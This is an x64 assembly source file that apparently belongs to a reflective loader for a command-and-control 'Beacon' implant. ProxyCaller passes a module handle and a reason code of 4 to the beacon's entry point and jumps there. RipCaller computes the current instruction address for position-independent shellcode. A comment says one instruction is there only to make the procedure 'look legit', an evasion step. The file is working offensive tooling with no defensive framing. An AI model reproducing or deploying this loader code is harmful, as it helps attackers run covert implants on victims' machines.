.x64
.model flat, fastcall
option casemap:none
option win64:1

; Export procedures
public ProxyCaller
public RipCaller

_TEXT$C segment

ProxyCaller:
    mov rbx, rdx
    xor rdx, rdx
    mov rax, [rbx]          ; Beacon entry point pointer
    mov rcx, [rbx + 08h]    ; hinstDLL
    mov edx, 04h            ; fdwReason
    xor r8, r8              ; lpvReserved
    jmp rax                 ; Jump to beacon entry point
    ret                     ; Useless ret to make the procedure look legit

RipCaller:
    call RipPtrCaller
    ret

RipPtrCaller:
    mov rax, [rsp]
    sub rax, 01dh
    ret

_TEXT$C ends

end
